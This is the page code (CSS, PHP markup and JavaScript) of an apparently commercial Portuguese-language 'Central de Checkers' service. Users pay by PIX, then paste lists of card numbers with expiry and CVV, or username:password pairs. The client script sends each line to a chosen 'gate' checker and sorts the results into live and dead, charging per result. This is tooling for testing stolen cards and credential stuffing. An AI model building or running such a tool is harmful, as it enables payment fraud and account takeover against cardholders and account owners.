.type-tabs{display:flex;gap:6px;margin-bottom:14px;background:rgba(0,0,0,.4);border-radius:12px;padding:5px;border:1px solid rgba(255,255,255,.05)}
.type-tab{flex:1;padding:10px;text-align:center;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;cursor:pointer;border-radius:9px;color:var(--muted);transition:all .2s;background:none;border:none;font-family:inherit}
.type-tab.active{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000;box-shadow:0 3px 12px rgba(0,255,136,.3)}
.gates-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.gate-card{background:rgba(0,0,0,.4);border:1.5px solid rgba(255,255,255,.08);border-radius:12px;padding:14px;cursor:pointer;transition:all .25s;position:relative;overflow:hidden}
.gate-card:hover{border-color:var(--border);transform:translateY(-2px)}
.gate-card.sel{border-color:var(--green);background:rgba(0,255,136,.06);box-shadow:0 0 20px rgba(0,255,136,.15)}
.gate-card .top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px}
.gate-card .ext{font-size:9px;font-weight:800;padding:2px 7px;border-radius:6px;background:rgba(0,255,136,.15);color:var(--green);text-transform:uppercase;letter-spacing:.5px}
.gate-card .nm{font-size:12px;font-weight:700;color:var(--text);word-break:break-all;font-family:'JetBrains Mono',monospace}
.gate-card .tp{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
textarea.lista{width:100%;min-height:110px;padding:14px;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,255,255,.08);border-radius:12px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;resize:vertical;transition:all .2s}
textarea.lista:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.08)}
.action-row{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
.btn{padding:11px 18px;border:none;border-radius:11px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;font-family:inherit;text-transform:uppercase;letter-spacing:.8px}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn-primary{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000;box-shadow:0 4px 16px rgba(0,255,136,.25)}
.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,255,136,.4)}
.btn-ghost{background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.1);color:var(--text)}
.btn-ghost:hover{border-color:var(--green);color:var(--green)}
.stats-inline{display:flex;gap:16px;flex-wrap:wrap;font-size:11px;color:var(--muted);margin-top:12px;font-weight:500}
.stats-inline strong{color:var(--text);font-family:'JetBrains Mono',monospace}
.results{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:20px}
.res-box{background:rgba(0,0,0,.35);border:1.5px solid rgba(255,255,255,.06);border-radius:14px;padding:14px;max-height:400px;overflow-y:auto}
.res-box.live{border-color:rgba(0,255,136,.25)}
.res-box.die{border-color:rgba(239,68,68,.25)}
.res-box h3{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.res-box.live h3{color:var(--green)}
.res-box.die h3{color:#f87171}
.res-item{background:rgba(0,0,0,.5);border-left:3px solid;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.5;animation:fadeUp .3s}
.res-item.live{border-color:var(--green)}
.res-item.die{border-color:var(--red)}
.res-item .hd{font-weight:700;margin-bottom:5px;word-break:break-all}
.res-item.live .hd{color:var(--green)}
.res-item.die .hd{color:#f87171}
.res-item .body{color:rgba(255,255,255,.75);white-space:pre-wrap;word-break:break-word;max-height:150px;overflow-y:auto}

/* ============ PIX MODAL ============ */
.pix-modal{position:fixed;inset:0;background:rgba(0,0,0,.92);backdrop-filter:blur(8px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
.pix-modal.show{display:flex;animation:fadeUp .3s}
.pix-box{background:linear-gradient(180deg,#0a0f1a,#05080f);border:1px solid rgba(0,255,136,.3);border-radius:22px;padding:28px;max-width:440px;width:100%;max-height:90vh;overflow-y:auto;position:relative;box-shadow:0 30px 80px rgba(0,0,0,.7)}
.pix-close{position:absolute;top:14px;right:14px;width:34px;height:34px;background:rgba(255,255,255,.06);border:none;border-radius:10px;color:var(--muted);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.pix-close:hover{background:rgba(239,68,68,.15);color:#f87171}
.pix-box h2{text-align:center;font-size:18px;font-weight:800;margin-bottom:6px;color:var(--green)}
.pix-box .sub{text-align:center;font-size:12px;color:var(--muted);margin-bottom:20px}
.pix-qr{background:#fff;padding:16px;border-radius:14px;margin-bottom:16px;text-align:center}
.pix-qr img{max-width:220px;width:100%;display:block;margin:0 auto;border-radius:8px}
.pix-copy-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;font-weight:700}
.pix-copy{background:rgba(0,0,0,.6);border:1.5px solid rgba(0,255,136,.25);border-radius:11px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:10px;word-break:break-all;color:var(--cyan);cursor:pointer;margin-bottom:14px;line-height:1.5;transition:all .2s}
.pix-copy:hover{border-color:var(--green)}
.pix-status{text-align:center;font-size:12px;color:var(--muted);display:flex;align-items:center;justify-content:center;gap:8px}
.pix-status .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.85)}}

@media(max-width:768px){.container{padding:16px}.card{padding:18px}.results{grid-template-columns:1fr}.auth-card{padding:32px 24px}.nav{padding:12px 16px}}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:rgba(0,0,0,.3)}
::-webkit-scrollbar-thumb{background:var(--green);border-radius:6px;opacity:.5}
</style>
</head>
<body>
<div class="wrap">

<?php if (!$user): ?>
<div class="auth-stage">
    <div class="auth-card">
        <div class="auth-inner">
            <div class="auth-logo">
                <div class="icon">⚡</div>
                <h1><?= SITE_NAME ?></h1>
                <p>Central de Checkers</p>
            </div>
            <div class="auth-tabs">
                <div class="auth-tab active" onclick="switchTab('login')">Entrar</div>
                <div class="auth-tab" onclick="switchTab('register')">Criar Conta</div>
            </div>
            <div id="msg" class="msg"></div>
            <form id="form-login" class="auth-form active" onsubmit="doLogin(event)">
                <div class="field"><label>Username</label><input type="text" name="username" required autocomplete="username" placeholder="seu_usuario"></div>
                <div class="field"><label>Senha</label><input type="password" name="password" id="pwd-login" required autocomplete="current-password" placeholder="••••••••"><span class="eye" onclick="togglePwd('pwd-login')">👁</span></div>
                <button type="submit" class="btn-main" id="btn-login">Entrar</button>
            </form>
            <form id="form-register" class="auth-form" onsubmit="doRegister(event)">
                <div class="field"><label>Username</label><input type="text" name="username" required minlength="3" maxlength="20" pattern="[a-zA-Z0-9_]+" autocomplete="username" placeholder="3-20 chars"></div>
                <div class="field"><label>Senha (min 6)</label><input type="password" name="password" id="pwd-reg" required minlength="6" autocomplete="new-password" placeholder="••••••••"><span class="eye" onclick="togglePwd('pwd-reg')">👁</span></div>
                <button type="submit" class="btn-main" id="btn-reg">Criar Conta</button>
            </form>
            <div class="auth-footer">⚡ <strong><?= BRAND ?></strong></div>
        </div>
    </div>
</div>
<?php else: ?>

<nav class="nav">
    <div class="brand">
        <div class="ico">⚡</div>
        <div><h1><?= SITE_NAME ?></h1><p>Central de Checkers</p></div>
    </div>
    <div class="right">
        <div class="bal-pill"><span class="lbl">Saldo</span><span class="val" id="bal"><?= fmtMoney((float)$user['balance']) ?></span></div>
        <div class="user-pill"><div class="av"><?= strtoupper(substr($user['username'],0,1)) ?></div><span class="nm"><?= esc($user['username']) ?></span></div>
        <a href="?logout" class="btn-out">Sair</a>
    </div>
</nav>

<div class="container">
    <div class="card">
        <div class="card-title">💳 Adicionar Saldo</div>
        <div class="deposit-row">
            <input type="number" id="dep-amount" min="<?= DEP_MIN ?>" max="<?= DEP_MAX ?>" step="0.01" value="20" placeholder="Valor">
            <button class="btn btn-primary" onclick="criarPix()">💰 Gerar PIX</button>
        </div>
        <div class="deposit-hint">Mínimo <?= fmtMoney(DEP_MIN) ?> · Máximo <?= fmtMoney(DEP_MAX) ?> · Via PIX</div>
    </div>

    <div class="card">
        <div class="card-title">🎯 Escolher Checker</div>
        <div class="type-tabs">
            <button class="type-tab active" onclick="setType('gate')">🎴 Gates</button>
            <button class="type-tab" onclick="setType('login')">🔐 Logins</button>
        </div>
        <div class="gates-grid" id="gates"></div>
    </div>

    <div class="card">
        <div class="card-title">📝 Dados</div>
        <div class="field" style="margin-bottom:12px">
            <label id="label-lista">Cartões (NÚMERO|MÊS|ANO|CVV)</label>
            <textarea class="lista" id="lista" placeholder="4532015112830366|12|2027|123"></textarea>
        </div>
        <div class="action-row">
            <button class="btn btn-primary" id="btn-run" onclick="runCheck()" disabled>▶ Iniciar</button>
            <button class="btn btn-ghost" onclick="stopCheck()">⏹ Parar</button>
            <button class="btn btn-ghost" onclick="clearAll()">🗑 Limpar</button>
        </div>
        <div class="stats-inline">
            <span>DIE: <strong><?= fmtMoney(DIE_COST) ?></strong></span>
            <span>LIVE: <strong><?= fmtMoney(LIVE_COST) ?></strong></span>
            <span>Processados: <strong id="st-proc">0</strong></span>
            <span>✅ <strong id="st-live" style="color:var(--green)">0</strong></span>
            <span>❌ <strong id="st-die" style="color:#f87171">0</strong></span>
        </div>
    </div>

    <div class="results">
        <div class="res-box live"><h3>✅ Aprovados</h3><div id="res-live"></div></div>
        <div class="res-box die"><h3>❌ Reprovados</h3><div id="res-die"></div></div>
    </div>
</div>

<div class="pix-modal" id="pix-modal">
    <div class="pix-box">
        <button class="pix-close" onclick="closePix()">✕</button>
        <h2>💰 PIX Gerado</h2>
        <div class="sub" id="pix-sub">Aguardando pagamento...</div>
        <div class="pix-qr"><img id="pix-img" src="" alt="QR"></div>
        <div class="pix-copy-label">Copia e Cola</div>
        <div class="pix-copy" id="pix-copy" onclick="copyPix()">—</div>
        <div class="pix-status"><span class="dot"></span>Aguardando confirmação...</div>
    </div>
</div>

<script>
const CSRF='<?= $csrf ?>';
const GATES={gate:<?= json_encode($gates['gate']) ?>,login:<?= json_encode($gates['login']) ?>};
let curType='gate',curGate='',running=false,curBalance=<?= (float)$user['balance'] ?>;

function switchTab(t){document.querySelectorAll('.auth-tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.auth-form').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.auth-tab')[t==='login'?0:1].classList.add('active');document.getElementById('form-'+t).classList.add('active');hideMsg()}
function showMsg(m,t){const e=document.getElementById('msg');e.textContent=m;e.className='msg '+(t==='ok'?'ok':'err')+' show'}
function hideMsg(){document.getElementById('msg').className='msg'}
function togglePwd(id){const i=document.getElementById(id);i.type=i.type==='password'?'text':'password'}

async function api(data){
    const r = await fetch(location.href, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({...data, csrf: CSRF}),
        credentials: 'same-origin'
    });
    const text = await r.text();
    try { return JSON.parse(text); }
    catch(e){ console.error('Non-JSON:', text.substring(0,500)); return {ok:false,error:'Resposta inválida do servidor'}; }
}

async function doLogin(e){
    e.preventDefault();
    const f=e.target, b=document.getElementById('btn-login');
    b.disabled=true; b.textContent='Entrando...'; hideMsg();
    try {
        const j = await api({action:'login', username:f.username.value, password:f.password.value});
        if(j.ok) location.reload();
        else { showMsg(j.error||'Erro','err'); b.disabled=false; b.textContent='Entrar'; }
    } catch(err){ showMsg('Erro de conexão','err'); b.disabled=false; b.textContent='Entrar'; }
}

async function doRegister(e){
    e.preventDefault();
    const f=e.target, b=document.getElementById('btn-reg');
    b.disabled=true; b.textContent='Criando...'; hideMsg();
    try {
        const j = await api({action:'register', username:f.username.value, password:f.password.value});
        if(j.ok) location.reload();
        else { showMsg(j.error||'Erro','err'); b.disabled=false; b.textContent='Criar Conta'; }
    } catch(err){ showMsg('Erro de conexão','err'); b.disabled=false; b.textContent='Criar Conta'; }
}

function setType(t){curType=t;curGate='';document.querySelectorAll('.type-tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.type-tab')[t==='gate'?0:1].classList.add('active');document.getElementById('label-lista').textContent=t==='gate'?'Cartões (NÚMERO|MÊS|ANO|CVV)':'Logins (USUÁRIO:SENHA)';document.getElementById('lista').placeholder=t==='gate'?'4532015112830366|12|2027|123':'usuario:senha';renderGates();document.getElementById('btn-run').disabled=true}

function renderGates(){
    const box=document.getElementById('gates'), arr=GATES[curType]||[];
    box.innerHTML='';
    if(!arr.length){box.innerHTML='<div style="grid-column:1/-1;text-align:center;padding:24px;color:var(--muted);font-size:12px">Nenhum checker em /'+curType+'/ ainda</div>';return}
    arr.forEach(f=>{
        const d=document.createElement('div'); d.className='gate-card'; d.dataset.gate=f;
        d.innerHTML=`<div class="top"><div class="nm">${f}</div><div class="ext">${f.split('.').pop()}</div></div><div class="tp">${curType==='gate'?'Cartão':'Login'}</div>`;
        d.onclick=()=>{curGate=f;document.querySelectorAll('.gate-card').forEach(x=>x.classList.remove('sel'));d.classList.add('sel');document.getElementById('btn-run').disabled=false};
        box.appendChild(d);
    });
}

async function criarPix(){
    const amt=parseFloat(document.getElementById('dep-amount').value);
    if(!amt||amt<<?= DEP_MIN ?>||amt><?= DEP_MAX ?>) return alert('Valor entre R$ <?= DEP_MIN ?> e R$ <?= DEP_MAX ?>');
    try{
        const j=await api({action:'deposit',amount:amt});
        if(!j.ok) return alert(j.error||'Erro');
        document.getElementById('pix-img').src=j.qr;
        document.getElementById('pix-copy').textContent=j.copy;
        document.getElementById('pix-sub').textContent='Valor: R$ '+j.amount.toFixed(2).replace('.',',');
        document.getElementById('pix-modal').classList.add('show');
        monitorPix(j.txid);
    }catch(e){alert('Erro de conexão')}
}

function monitorPix(txid){
    const iv=setInterval(async()=>{
        if(!document.getElementById('pix-modal').classList.contains('show')){clearInterval(iv);return}
        try{const j=await api({action:'status',txid:txid});
            if(j.ok&&j.status==='paid'){clearInterval(iv);document.getElementById('pix-sub').textContent='✅ Pago! Saldo atualizado';document.getElementById('pix-sub').style.color='var(--green)';setTimeout(()=>{closePix();location.reload()},1500)}
        }catch(e){}
    },4000);
}

function closePix(){document.getElementById('pix-modal').classList.remove('show')}
function copyPix(){const t=document.getElementById('pix-copy').textContent;navigator.clipboard.writeText(t).then(()=>{const el=document.getElementById('pix-copy');el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='rgba(0,255,136,.25)',1000)})}

async function runCheck(){
    if(!curGate) return alert('Escolha um checker');
    const lista=document.getElementById('lista').value.trim();
    if(!lista) return alert('Cole os dados');
    const items=lista.split('\n').filter(l=>l.trim());
    if(!items.length) return;
    running=true; let idx=0,live=0,die=0; clearAll();
    while(running && idx<items.length){
        const it=items[idx];
        try{
            const j=await api({action:'check',gate:curGate,type:curType,lista:it});
            if(!j.ok){addRes(it,'❌ '+(j.error||'Erro'),false);die++}
            else{addRes(it,j.response,j.live);if(j.live)live++;else die++;curBalance=j.balance;document.getElementById('bal').textContent='R$ '+j.balance.toFixed(2).replace('.',',')}
        }catch(e){addRes(it,'❌ Erro conexão',false);die++}
        idx++;
        document.getElementById('st-proc').textContent=idx;
        document.getElementById('st-live').textContent=live;
        document.getElementById('st-die').textContent=die;
        if(running && idx<items.length) await new Promise(r=>setTimeout(r,1500));
    }
    running=false;
}

function stopCheck(){running=false}
function clearAll(){document.getElementById('res-live').innerHTML='';document.getElementById('res-die').innerHTML='';document.getElementById('st-proc').textContent='0';document.getElementById('st-live').textContent='0';document.getElementById('st-die').textContent='0'}

function addRes(input,resp,isLive){
    const box=document.getElementById(isLive?'res-live':'res-die');
    const d=document.createElement('div'); d.className='res-item '+(isLive?'live':'die');
    d.innerHTML=`<div class="hd">${input.length>60?input.substring(0,60)+'...':input}</div><div class="body">${resp.replace(/</g,'&lt;')}</div>`;
    box.insertBefore(d,box.firstChild);
}

document.addEventListener('DOMContentLoaded',()=>renderGates());
</script>
<?php endif; ?>
</div>
</body>
</html>
